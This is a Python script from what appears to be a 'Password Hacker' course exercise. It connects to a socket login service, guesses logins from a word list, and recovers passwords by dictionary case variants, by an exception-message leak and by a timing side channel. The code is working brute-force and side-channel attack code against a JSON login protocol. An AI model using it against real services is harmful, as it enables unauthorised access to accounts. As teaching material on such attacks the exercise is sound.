# write your code here
import sys
import socket
from string import ascii_letters, digits
import itertools
import json
import datetime


def get_common_passwords():
    passwords_file = open('/Users/pavelmaseichuk/PycharmProjects/Password Hacker/Password Hacker/task/hacking/passwords.txt')
    lines = []
    for line in passwords_file:
        lines.append(line.strip())
    passwords_file.close()
    return lines


def get_common_logins():
    passwords_file = open('/Users/pavelmaseichuk/PycharmProjects/Password Hacker/Password Hacker/task/hacking/logins.txt')
    lines = []
    for line in passwords_file:
        lines.append(line.strip())
    passwords_file.close()
    return lines


args = sys.argv
if len(args) != 3:
    print('Wrong arguments')
    exit(0)

address = args[1]
port = int(args[2])

my_socket = socket.socket()
my_socket.connect((address, port))


def brute_force_gen():
    possible_symbols = ascii_letters + digits
    length = 1
    while True:
        for pass_tuple in itertools.product(possible_symbols, repeat=length):
            password = ''
            for letter in pass_tuple:
                password += letter
            yield password
        length += 1


def dictionary_password_gen():
    passwords = get_common_passwords()
    for password in passwords:
        letters = [char for char in password]
        uppercase_letters = [char.upper() for char in password]
        for combo in itertools.product(range(2), repeat=len(password)):
            generated = ''
            for i in range(len(password)):
                generated += letters[i] if combo[i] == 0 else uppercase_letters[i]
            yield generated


def random_with_prefix(prefix):
    possible_symbols = ascii_letters + digits
    for symbol in possible_symbols:
        yield prefix + symbol


# generator = brute_force_gen()
# for guess in generator:
#     # print(guess)
#     my_socket.send(guess.encode())
#     response = my_socket.recv(1024).decode()
#     if response == 'Connection success!':
#         print(guess)
#         break
#     elif response == 'Too many attempts':
#         print('Password not found')
#         break

def encode_payload(login, password):
    return json.dumps({"login": login, "password": password})


def request(payload):
    my_socket.send(payload.encode())
    response = my_socket.recv(1024).decode()
    decoded_response = json.loads(response)
    return decoded_response['result']


def find_login():
    logins = get_common_logins()
    for guess in logins:
        payload = encode_payload(guess, '')
        result = request(payload)
        if result != 'Wrong login!':
            return guess


def find_password(login):
    password = ''
    while True:
        generator = random_with_prefix(password)
        for guess in generator:
            payload = encode_payload(login, guess)
            result = request(payload)
            if result == 'Exception happened during login':
                password = guess
                break
            elif result == 'Connection success!':
                return guess


def find_password_time_based(login):
    password = ''
    while True:
        generator = random_with_prefix(password)
        max_request_duration = 0
        temp_new_password = 'a'
        for guess in generator:
            start = datetime.datetime.today()
            payload = encode_payload(login, guess)
            result = request(payload)
            if result == 'Connection success!':
                return guess
            request_duration = (datetime.datetime.today() - start).microseconds
            if request_duration > max_request_duration:
                max_request_duration = request_duration
                temp_new_password = guess
        password = temp_new_password


found_login = find_login()
# found_password = find_password(found_login)
found_password = find_password_time_based(found_login)
print(json.dumps({"login": found_login, "password": found_password}))

my_socket.close()
